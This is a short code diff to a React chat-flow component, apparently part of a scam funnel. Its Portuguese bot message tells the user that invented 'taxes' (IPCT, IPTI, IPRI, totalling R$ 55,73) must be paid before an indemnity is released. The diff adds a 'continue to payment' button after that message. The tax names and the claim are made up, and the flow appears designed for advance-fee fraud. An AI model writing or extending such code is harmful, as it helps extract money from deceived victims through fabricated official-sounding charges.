@@ -174,7 +174,8 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
       type: 'bot',
       content: `IMPORTANTE: Escute o áudio abaixo com bastante atenção!\n\n💰 Impostos necessários para liberação:\n\n🏦 IPCT (Imposto sobre Circulação de Transferência 0,21%): R$ 16,49\n\n📋 IPTI (Imposto sobre Transferência Indenizatório 0,25%): R$ 19,64\n\n✅ IPRI (Imposto sobre Recebimento Indenizatório 0,25%): R$ 19,64\n\n💳 Valor total do Imposto: R$ 55,73\n(Apenas 0,71% do valor total a receber)`,
       delay: 3000,
-      showAudio: true
+      showAudio: true,
+      options: ["CONTINUAR PARA PAGAMENTO"]
     },
     {
       id: 12,
